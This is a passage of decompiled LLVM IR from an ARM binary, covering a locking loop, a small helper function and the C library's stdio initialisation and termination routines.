  %v0_172bc92 = phi i32 [ %v1_172b4.pre, %dec_label_pc_172bc.dec_label_pc_172b0_crit_edge ], [ %v2_172a4, %dec_label_pc_172a4 ]
  store i32 %v0_172bc92, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_172cc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_172cc, label %dec_label_pc_172d0, label %dec_label_pc_172bc.dec_label_pc_172b0_crit_edge

dec_label_pc_172bc.dec_label_pc_172b0_crit_edge:  ; preds = %dec_label_pc_172bc
  %v0_172b0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_172b4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_172b0 = inttoptr i32 %v0_172b0.pre to i32*
  %v2_172b0 = load i32, i32* %v1_172b0, align 4
  store i32 %v2_172b0, i32* %r3.global-to-local, align 4
  %v3_172b4 = icmp uge i32 %v2_172b0, %v1_172b4.pre
  store i1 %v3_172b4, i1* %cpsr_c.global-to-local, align 1
  %v9_172b4 = icmp eq i32 %v2_172b0, %v1_172b4.pre
  br i1 %v9_172b4, label %dec_label_pc_172bc, label %dec_label_pc_172d4

dec_label_pc_172d0:                               ; preds = %dec_label_pc_172bc
  %v0_172d0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_172d0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_172d4

dec_label_pc_172d4:                               ; preds = %dec_label_pc_172a4, %dec_label_pc_172bc.dec_label_pc_172b0_crit_edge, %dec_label_pc_172d0
  %v0_172dc = phi i32 [ %v0_172d0, %dec_label_pc_172d0 ], [ %v2_172b083, %dec_label_pc_172a4 ], [ %v2_172b0, %dec_label_pc_172bc.dec_label_pc_172b0_crit_edge ]
  %v1_172d4 = phi i32 [ %v0_172d0, %dec_label_pc_172d0 ], [ %v2_172a4, %dec_label_pc_172a4 ], [ %v1_172b4.pre, %dec_label_pc_172bc.dec_label_pc_172b0_crit_edge ]
  %v3_172d4 = icmp uge i32 %v0_172dc, %v1_172d4
  store i1 %v3_172d4, i1* %cpsr_c.global-to-local, align 1
  %v9_172d4 = icmp eq i32 %v0_172dc, %v1_172d4
  br i1 %v9_172d4, label %dec_label_pc_172dc, label %dec_label_pc_172d4.dec_label_pc_172a4_crit_edge

dec_label_pc_172d4.dec_label_pc_172a4_crit_edge:  ; preds = %dec_label_pc_172d4
  %v0_172a4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_172a4

dec_label_pc_172dc:                               ; preds = %dec_label_pc_172d4
  %v2_172dc = icmp ne i32 %v1_172d4, 0
  store i1 %v2_172dc, i1* %cpsr_c.global-to-local, align 1
  %v7_172e0 = icmp slt i32 %v1_172d4, 2
  br i1 %v7_172e0, label %dec_label_pc_172fc, label %dec_label_pc_172e4

dec_label_pc_172e4:                               ; preds = %dec_label_pc_172dc
  %v0_172e4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_172e4, i32* %r0.global-to-local, align 4
  %v0_172e8 = load i32, i32* @r1, align 4
  %v1_172e8 = add i32 %v0_172e8, 129
  store i32 %v1_172e8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_172fc

dec_label_pc_172fc:                               ; preds = %dec_label_pc_17260, %dec_label_pc_172e4, %dec_label_pc_172dc
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17300 = load i32, i32* @r8, align 4
  %v2_17300 = add i32 %v0_17300, 160
  %v3_17300 = inttoptr i32 %v2_17300 to i32*
  %v4_17300 = load i32, i32* %v3_17300, align 4
  store i32 %v4_17300, i32* %r0.global-to-local, align 4
  %v1_17304 = add i32 %v4_17300, 4
  %v2_17304 = inttoptr i32 %v1_17304 to i32*
  %v3_17304 = load i32, i32* %v2_17304, align 4
  %v1_17308 = add i32 %v3_17304, -1
  store i32 %v1_17308, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1730c = icmp eq i32 %v1_17308, 0
  store i32 %v1_17308, i32* %v2_17304, align 4
  br i1 %v2_1730c, label %dec_label_pc_17318, label %dec_label_pc_17380

dec_label_pc_17318:                               ; preds = %dec_label_pc_172fc
  %v0_17318 = load i32, i32* %r3.global-to-local, align 4
  %v1_17318 = load i32, i32* %r0.global-to-local, align 4
  %v2_17318 = add i32 %v1_17318, 8
  %v3_17318 = inttoptr i32 %v2_17318 to i32*
  store i32 %v0_17318, i32* %v3_17318, align 4
  %v0_1731c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1731c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17320

dec_label_pc_17320:                               ; preds = %dec_label_pc_17350.dec_label_pc_17320_crit_edge, %dec_label_pc_17318
  %v0_17320 = phi i32 [ %v0_17320.pre, %dec_label_pc_17350.dec_label_pc_17320_crit_edge ], [ %v0_1731c, %dec_label_pc_17318 ]
  %v1_17320 = inttoptr i32 %v0_17320 to i32*
  %v2_17320 = load i32, i32* %v1_17320, align 4
  store i32 %v2_17320, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_17320, i32* %r2.global-to-local, align 4
  %v2_1732c71 = load i32, i32* %v1_17320, align 4
  store i32 %v2_1732c71, i32* %r3.global-to-local, align 4
  %v3_1733073 = icmp uge i32 %v2_1732c71, %v2_17320
  store i1 %v3_1733073, i1* %cpsr_c.global-to-local, align 1
  %v9_1733079 = icmp eq i32 %v2_1732c71, %v2_17320
  br i1 %v9_1733079, label %dec_label_pc_17338, label %dec_label_pc_17350

dec_label_pc_17338:                               ; preds = %dec_label_pc_17320, %dec_label_pc_17338.dec_label_pc_1732c_crit_edge
  %v0_1733880 = phi i32 [ %v1_17330.pre, %dec_label_pc_17338.dec_label_pc_1732c_crit_edge ], [ %v2_17320, %dec_label_pc_17320 ]
  store i32 %v0_1733880, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17348 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17348, label %dec_label_pc_1734c, label %dec_label_pc_17338.dec_label_pc_1732c_crit_edge

dec_label_pc_17338.dec_label_pc_1732c_crit_edge:  ; preds = %dec_label_pc_17338
  %v0_1732c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17330.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1732c = inttoptr i32 %v0_1732c.pre to i32*
  %v2_1732c = load i32, i32* %v1_1732c, align 4
  store i32 %v2_1732c, i32* %r3.global-to-local, align 4
  %v3_17330 = icmp uge i32 %v2_1732c, %v1_17330.pre
  store i1 %v3_17330, i1* %cpsr_c.global-to-local, align 1
  %v9_17330 = icmp eq i32 %v2_1732c, %v1_17330.pre
  br i1 %v9_17330, label %dec_label_pc_17338, label %dec_label_pc_17350

dec_label_pc_1734c:                               ; preds = %dec_label_pc_17338
  %v0_1734c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1734c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17350

dec_label_pc_17350:                               ; preds = %dec_label_pc_17320, %dec_label_pc_17338.dec_label_pc_1732c_crit_edge, %dec_label_pc_1734c
  %v0_17358 = phi i32 [ %v0_1734c, %dec_label_pc_1734c ], [ %v2_1732c71, %dec_label_pc_17320 ], [ %v2_1732c, %dec_label_pc_17338.dec_label_pc_1732c_crit_edge ]
  %v1_17350 = phi i32 [ %v0_1734c, %dec_label_pc_1734c ], [ %v2_17320, %dec_label_pc_17320 ], [ %v1_17330.pre, %dec_label_pc_17338.dec_label_pc_1732c_crit_edge ]
  %v3_17350 = icmp uge i32 %v0_17358, %v1_17350
  store i1 %v3_17350, i1* %cpsr_c.global-to-local, align 1
  %v9_17350 = icmp eq i32 %v0_17358, %v1_17350
  br i1 %v9_17350, label %dec_label_pc_17358, label %dec_label_pc_17350.dec_label_pc_17320_crit_edge

dec_label_pc_17350.dec_label_pc_17320_crit_edge:  ; preds = %dec_label_pc_17350
  %v0_17320.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17320

dec_label_pc_17358:                               ; preds = %dec_label_pc_17350
  %v2_17358 = icmp ne i32 %v1_17350, 0
  store i1 %v2_17358, i1* %cpsr_c.global-to-local, align 1
  %v7_1735c = icmp slt i32 %v1_17350, 2
  br i1 %v7_1735c, label %dec_label_pc_17380, label %dec_label_pc_17360

dec_label_pc_17360:                               ; preds = %dec_label_pc_17358
  %v0_17360 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_17360, i32* %r0.global-to-local, align 4
  %v0_17364 = load i32, i32* @r1, align 4
  %v1_17364 = add i32 %v0_17364, 129
  store i32 %v1_17364, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17380

dec_label_pc_1737c:                               ; preds = %dec_label_pc_16fc0, %dec_label_pc_16fa4, %dec_label_pc_16fcc
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_17380

dec_label_pc_17380:                               ; preds = %dec_label_pc_172fc, %dec_label_pc_17358, %bb57, %dec_label_pc_17004, %dec_label_pc_17360, %dec_label_pc_1737c
  %v0_17380 = load i32, i32* @r5, align 4
  store i32 %v0_17380, i32* %r0.global-to-local, align 4
  %v2_17388 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_17388, i32* %r4.global-to-local, align 4
  store i32 %v6_16f64, i32* @r5, align 4
  store i32 %v9_16f64, i32* @r6, align 4
  store i32 %v12_16f64, i32* @r7, align 4
  store i32 %v15_16f64, i32* @r8, align 4
  ret i32 %v0_17380

; uselistorder directives
  uselistorder i32 %v0_1734c, { 1, 0, 2 }
  uselistorder i32 %v1_17330.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17320, { 1, 0 }
  uselistorder i32 %v0_172d0, { 1, 0, 2 }
  uselistorder i32 %v1_172b4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_172a4, { 1, 0 }
  uselistorder i32 %v0_1724c, { 1, 0, 2 }
  uselistorder i32 %v1_17230.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_171e4, { 1, 0, 2 }
  uselistorder i32 %v1_171c8, { 0, 2, 1 }
  uselistorder i32 %v4_171a4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_17154.pre, { 2, 1, 0 }
  uselistorder i32 %v0_170d8, { 1, 2, 0 }
  uselistorder i32 %v1_17068, { 1, 0 }
  uselistorder i32 %v0_17068, { 1, 0 }
  uselistorder i32 %v1_17050, { 1, 2, 0, 3 }
  uselistorder i32 %v1_16ff4, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 53, 5, 6, 7, 8, 9, 11, 10, 51, 13, 12, 14, 15, 16, 17, 18, 19, 21, 20, 52, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0, 49, 50 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 25, 22, 23, 24, 26, 27, 28 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 36, 37, 3, 4, 5, 6, 32, 33, 7, 8, 9, 34, 35, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 16384, { 74, 75, 0, 1, 76, 37, 67, 38, 68, 39, 69, 40, 70, 41, 71, 42, 72, 19, 73, 18, 57, 17, 53, 35, 54, 16, 51, 15, 52, 14, 55, 36, 56, 34, 58, 13, 59, 12, 60, 11, 61, 10, 62, 9, 63, 8, 64, 7, 65, 6, 66, 43, 77, 4, 78, 5, 79, 80, 46, 81, 47, 82, 48, 83, 44, 84, 20, 85, 45, 86, 21, 87, 22, 88, 24, 89, 23, 90, 26, 91, 25, 92, 27, 93, 28, 94, 29, 95, 30, 96, 31, 97, 49, 98, 32, 2, 50, 99, 33, 3 }
  uselistorder i32 (i32, i32)* @__libc_open, { 8, 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 12, 0, 11, 8, 7, 10, 9, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 1024, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 ()* @malloc, { 43, 42, 41, 4, 3, 2, 0, 1, 7, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 6, 5 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 ()* @free, { 10, 9, 5, 4, 3, 2, 1, 8, 7, 6, 0 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_17380, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1737c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17350, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17338, { 1, 0 }
  uselistorder label %dec_label_pc_172fc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_172d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_172bc, { 1, 0 }
  uselistorder label %dec_label_pc_17260, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_17250, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17238, { 1, 0 }
  uselistorder label %dec_label_pc_171f8, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_171e8, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17130, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_17098._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_17040, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_16fdc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16fa4, { 1, 2, 0 }
}

define i32 @function_17394(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17394:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_17394 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17394, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17394
  %v5_17394 = sdiv i32 %arg2, 16
  %v6_17394 = and i32 %v5_17394, %tmp
  %v5_17398 = sdiv i32 %arg2, 256
  %v6_17398 = and i32 %v6_17394, %v5_17398
  store i32 %v6_17398, i32* %r0.global-to-local, align 4
  %v1_1739c = load i32, i32* @ip, align 4
  %v2_1739c = trunc i32 %v1_1739c to i16
  %v4_1739c = inttoptr i32 %v6_17398 to i16*
  store i16 %v2_1739c, i16* %v4_1739c, align 2
  %v5_1739c = load i32, i32* @r4, align 4
  %v6_1739c = load i32, i32* %r0.global-to-local, align 4
  %v7_1739c = sub i32 %v6_1739c, %v5_1739c
  store i32 %v7_1739c, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17394, %bb
  %v8_1739c = phi i32 [ %tmp, %dec_label_pc_17394 ], [ %v7_1739c, %bb ]
  ret i32 %v8_1739c

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_173cc = call i32 @__aeabi_read_tp()
  %v3_173d0 = load i16, i16* @global_var_23068.362, align 2
  %v4_173d0 = sext i16 %v3_173d0 to i32
  store i32 %v4_173d0, i32* @r3, align 4
  store i32 %v0_173cc, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_173dc = add i32 %v4_173d0, %v0_173cc
  %v3_173dc = inttoptr i32 %v2_173dc to i32*
  %v4_173dc = load i32, i32* %v3_173dc, align 4
  store i32 %v4_173dc, i32* @r6, align 4
  %v1_173e0 = call i32 @isatty(i32 0)
  %v2_173e8 = icmp eq i32 %v1_173e0, 0
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @r4, align 4
  br i1 %v2_173e8, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_173f4 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 304) to i16*), align 4
  %v7_173f4 = zext i16 %v5_173f4 to i32
  %v2_173f8 = xor i32 %v7_173f4, 256
  store i32 %v2_173f8, i32* @r3, align 4
  %v2_173fc = trunc i32 %v2_173f8 to i16
  store i16 %v2_173fc, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 304) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_17404 = call i32 @isatty(i32 1)
  %v2_17408 = icmp eq i32 %v1_17404, 0
  br i1 %v2_17408, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_17410 = load i32, i32* @r4, align 4
  %v2_17414 = add i32 %v1_17410, 372
  %v3_17414 = inttoptr i32 %v2_17414 to i16*
  %v4_17414 = load i16, i16* %v3_17414, align 2
  %v2_17418 = xor i16 %v4_17414, 256
  store i16 %v2_17418, i16* %v3_17414, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_17424 = load i16, i16* @global_var_23068.362, align 2
  %v4_17424 = sext i16 %v3_17424 to i32
  %v0_17428 = load i32, i32* @r6, align 4
  %v1_17428 = load i32, i32* @r5, align 4
  %v3_17428 = add i32 %v1_17428, %v4_17424
  %v4_17428 = inttoptr i32 %v3_17428 to i32*
  store i32 %v0_17428, i32* %v4_17428, align 4
  ret i32 %v1_17404

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_17444 = load i32, i32* @r4, align 4
  store i32 %v3_17444, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 -33380), i32* %r3.global-to-local, align 4
  %v2_17458 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 -33380) to i32*), align 4
  store i32 %v2_17458, i32* %r0.global-to-local, align 4
  %v5_17458 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 -33376) to i32*), align 4
  store i32 %v5_17458, i32* %r1.global-to-local, align 4
  %v8_17458 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 -33372) to i32*), align 4
  %v2_17460 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_17460, i32* %r3.global-to-local, align 4
  store i32 %v2_17458, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_1746c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 152) to i32*), align 4
  store i32 %v2_17458, i32* %r0.global-to-local, align 4
  store i32 %v5_17458, i32* %r1.global-to-local, align 4
  store i32 %v8_17458, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 -33392), i32* %r3.global-to-local, align 4
  %v1_1747c = inttoptr i32 %v4_1746c to i32*
  store i32 %v2_17458, i32* %v1_1747c, align 4
  %v3_1747c = add i32 %v4_1746c, 4
  %v4_1747c = inttoptr i32 %v3_1747c to i32*
  %v5_1747c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1747c, i32* %v4_1747c, align 4
  %v6_1747c = add i32 %v4_1746c, 8
  %v7_1747c = inttoptr i32 %v6_1747c to i32*
  %v8_1747c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1747c, i32* %v7_1747c, align 4
  %v0_17480 = load i32, i32* %r3.global-to-local, align 4
  %v1_17480 = inttoptr i32 %v0_17480 to i32*
  %v2_17480 = load i32, i32* %v1_17480, align 4
  store i32 %v2_17480, i32* %r0.global-to-local, align 4
  %v3_17480 = add i32 %v0_17480, 4
  %v4_17480 = inttoptr i32 %v3_17480 to i32*
  %v5_17480 = load i32, i32* %v4_17480, align 4
  store i32 %v5_17480, i32* %r1.global-to-local, align 4
  %v6_17480 = add i32 %v0_17480, 8
  %v7_17480 = inttoptr i32 %v6_17480 to i32*
  %v8_17480 = load i32, i32* %v7_17480, align 4
  %v2_17484 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_17484, i32* %r3.global-to-local, align 4
  store i32 %v2_17480, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_17490 = load i32, i32* %r7.global-to-local, align 4
  %v2_17490 = add i32 %v0_17490, 76
  %v3_17490 = inttoptr i32 %v2_17490 to i32*
  %v4_17490 = load i32, i32* %v3_17490, align 4
  store i32 %v4_17490, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_17498 = inttoptr i32 %v4_17490 to i32*
  %v2_17498 = load i32, i32* %v1_17498, align 4
  store i32 %v2_17498, i32* %r5.global-to-local, align 4
  %v2_1749c = add i32 %v0_17490, 160
  %v3_1749c = inttoptr i32 %v2_1749c to i32*
  %v4_1749c = load i32, i32* %v3_1749c, align 4
  store i32 %v2_17480, i32* %r0.global-to-local, align 4
  store i32 %v5_17480, i32* %r1.global-to-local, align 4
  store i32 %v8_17480, i32* %r2.global-to-local, align 4
  store i32 -33404, i32* %r3.global-to-local, align 4
  %v2_174ac = add i32 %v0_17490, -33404
  store i32 %v2_174ac, i32* %sl.global-to-local, align 4
  %v1_174b0 = inttoptr i32 %v4_1749c to i32*
  store i32 %v2_17480, i32* %v1_174b0, align 4
  %v3_174b0 = add i32 %v4_1749c, 4
  %v4_174b0 = inttoptr i32 %v3_174b0 to i32*
  %v5_174b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_174b0, i32* %v4_174b0, align 4
  %v6_174b0 = add i32 %v4_1749c, 8
  %v7_174b0 = inttoptr i32 %v6_174b0 to i32*
  %v8_174b0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_174b0, i32* %v7_174b0, align 4
  %v0_17540.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1754016 = icmp eq i32 %v0_17540.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1754818 = add i32 %v0_17540.pr, 56
  store i32 %v1_1754818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_1754016, label %dec_label_pc_17554, label %dec_label_pc_174b8

dec_label_pc_174b8:                               ; preds = %entry, %.thread10
  %v0_174b8 = phi i32 [ %v3_1753c, %.thread10 ], [ %v0_17540.pr, %entry ]
  %v1_174b8 = add i32 %v0_174b8, 64
  %v2_174b8 = inttoptr i32 %v1_174b8 to i32*
  %v3_174b8 = load i32, i32* %v2_174b8, align 4
  store i32 %v3_174b8, i32* %r3.global-to-local, align 4
  %v0_174bc = call i32 @__aeabi_read_tp()
  store i32 %v0_174bc, i32* %r0.global-to-local, align 4
  %v1_174c0 = add i32 %v0_174bc, -1168
  store i32 %v1_174c0, i32* %r6.global-to-local, align 4
  %v3_174c4 = icmp uge i32 %v3_174b8, %v1_174c0
  store i1 %v3_174c4, i1* %cpsr_c.global-to-local, align 1
  %v9_174c4 = icmp eq i32 %v3_174b8, %v1_174c0
  br i1 %v9_174c4, label %.thread1, label %dec_label_pc_174d8

.thread1:                                         ; preds = %dec_label_pc_174b8
  %v1_174c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_174c8 = add i32 %v1_174c8, 60
  %v3_174c8 = inttoptr i32 %v2_174c8 to i32*
  %v4_174c8 = load i32, i32* %v3_174c8, align 4
  %v2_174cc = add i32 %v4_174c8, 1
  store i32 %v2_174cc, i32* %r3.global-to-local, align 4
  store i32 %v2_174cc, i32* %v3_174c8, align 4
  br label %.thread10

dec_label_pc_174d8:                               ; preds = %dec_label_pc_174b8, %dec_label_pc_174e4
  %v0_174d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_174d8 = inttoptr i32 %v0_174d8 to i32*
  %v2_174d8 = load i32, i32* %v1_174d8, align 4
  store i32 %v2_174d8, i32* %r3.global-to-local, align 4
  %v1_174dc = load i32, i32* %r4.global-to-local, align 4
  %v3_174dc = icmp uge i32 %v2_174d8, %v1_174dc
  store i1 %v3_174dc, i1* %cpsr_c.global-to-local, align 1
  %v9_174dc = icmp eq i32 %v2_174d8, %v1_174dc
  br i1 %v9_174dc, label %dec_label_pc_174e4, label %dec_label_pc_174fc

dec_label_pc_174e4:                               ; preds = %dec_label_pc_174d8
  store i32 %v2_174d8, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_174f4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_174f4, label %dec_label_pc_174f8, label %dec_label_pc_174d8

dec_label_pc_174f8:                               ; preds = %dec_label_pc_174e4
  %v0_174f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_174f8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_174fc

dec_label_pc_174fc:                               ; preds = %dec_label_pc_174d8, %dec_label_pc_174f8
  %v0_174fc = phi i32 [ %v0_174f8, %dec_label_pc_174f8 ], [ %v2_174d8, %dec_label_pc_174d8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_174fc = icmp eq i32 %v0_174fc, 0
  %v2_17508.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_174fc, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_174fc
  %v1_17508 = load i32, i32* %r6.global-to-local, align 4
  %v3_17508 = add i32 %v2_17508.pre, 64
  %v4_17508 = inttoptr i32 %v3_17508 to i32*
  store i32 %v1_17508, i32* %v4_17508, align 4
  %v1_1750c = load i32, i32* %r1.global-to-local, align 4
  %v2_1750c = load i32, i32* %r5.global-to-local, align 4
  %v3_1750c = add i32 %v2_1750c, 60
  %v4_1750c = inttoptr i32 %v3_1750c to i32*
  store i32 %v1_1750c, i32* %v4_1750c, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_174fc
  %v2_17500 = add i32 %v2_17508.pre, 8
  %v3_17500 = inttoptr i32 %v2_17500 to i32*
  %v4_17500 = load i32, i32* %v3_17500, align 4
  store i32 %v4_17500, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_17510 = add i32 %v2_17508.pre, 20
  %v4_17510 = inttoptr i32 %v3_17510 to i32*
  store i32 %v4_17500, i32* %v4_17510, align 4
  %v1_17514 = load i32, i32* %r2.global-to-local, align 4
  %v2_17514 = trunc i32 %v1_17514 to i16
  %v3_17514 = load i32, i32* %r5.global-to-local, align 4
  %v4_17514 = inttoptr i32 %v3_17514 to i16*
  store i16 %v2_17514, i16* %v4_17514, align 2
  %v1_17518 = load i32, i32* %r3.global-to-local, align 4
  %v2_17518 = load i32, i32* %r5.global-to-local, align 4
  %v3_17518 = add i32 %v2_17518, 24
  %v4_17518 = inttoptr i32 %v3_17518 to i32*
  store i32 %v1_17518, i32* %v4_17518, align 4
  %v1_1751c = load i32, i32* %r3.global-to-local, align 4
  %v2_1751c = load i32, i32* %r5.global-to-local, align 4
  %v3_1751c = add i32 %v2_1751c, 28
  %v4_1751c = inttoptr i32 %v3_1751c to i32*
  store i32 %v1_1751c, i32* %v4_1751c, align 4
  %v1_17520 = load i32, i32* %r3.global-to-local, align 4
  %v2_17520 = load i32, i32* %r5.global-to-local, align 4
  %v3_17520 = add i32 %v2_17520, 16
  %v4_17520 = inttoptr i32 %v3_17520 to i32*
  store i32 %v1_17520, i32* %v4_17520, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_17524 = load i32, i32* %sl.global-to-local, align 4
  %v1_17524 = inttoptr i32 %v0_17524 to i32*
  %v2_17524 = load i32, i32* %v1_17524, align 4
  store i32 %v2_17524, i32* %r0.global-to-local, align 4
